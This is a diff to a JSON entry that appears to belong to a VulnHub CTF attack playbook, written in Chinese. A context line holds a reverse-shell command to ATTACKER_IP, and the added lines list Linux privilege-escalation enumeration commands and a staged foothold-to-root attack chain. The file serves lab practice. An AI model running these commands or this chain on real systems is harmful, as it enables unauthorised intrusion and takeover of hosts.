@@ -83,6 +83,60 @@
   "requires_callback": false,
   "callback_note": "如果漏洞需要反弹shell，可使用nc监听端口：nc -lvnp 4444，并在webshell中执行：bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
   "remediation": "1. 及时更新系统和应用补丁；2. 使用强密码策略；3. 限制文件上传类型和大小；4. 配置适当的访问控制；5. 定期进行安全审计和渗透测试",
+  "privesc_steps": [
+    {
+      "step": 1,
+      "description": "立足后确认内核与发行版，便于对照公开提权漏洞",
+      "command": "uname -a && cat /etc/os-release"
+    },
+    {
+      "step": 2,
+      "description": "检查 sudo、SUID、capabilities 等常见本地提权面",
+      "command": "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -40; getcap -r / 2>/dev/null | head -30"
+    },
+    {
+      "step": 3,
+      "description": "查看定时任务与启动项",
+      "command": "ls -la /etc/cron* 2>/dev/null; systemctl list-timers 2>/dev/null | head -20"
+    },
+    {
+      "step": 4,
+      "description": "枚举当前用户可写路径（限制深度减少噪音）",
+      "command": "find / -maxdepth 4 -writable -type d -user $(whoami) 2>/dev/null | head -30"
+    }
+  ],
+  "path_templates": [
+    {
+      "stage": "surface_enum",
+      "precondition": "多端口/多服务暴露",
+      "action": "robots.txt、目录枚举、管理入口与备份文件",
+      "success_sign": "发现可登录面或上传/配置泄露",
+      "next_stage": "foothold"
+    },
+    {
+      "stage": "foothold",
+      "precondition": "存在 Web 或配置类弱点",
+      "action": "按指纹选择利用（上传/注入/默认口令）拿 RCE 或凭据",
+      "success_sign": "RCE 回显或有效会话",
+      "next_stage": "post_foothold_enum"
+    },
+    {
+      "stage": "privesc",
+      "precondition": "低权限 shell 或 RCE",
+      "action": "sudo -l、SUID、cron、内核版本对照",
+      "success_sign": "root 或目标 flag",
+      "next_stage": "objective"
+    }
+  ],
+  "fallbacks": [
+    {
+      "stage": "foothold",
+      "action": "Web 无果时转向 SSH/其他开放服务横向尝试"
+    }
+  ],
+  "opsec_notes": [
+    "Planets 系列常为多入口，勿卡在单一 CVE；保持攻链思维"
+  ],
   "tags": [
     "vulnhub",
     "ctf",
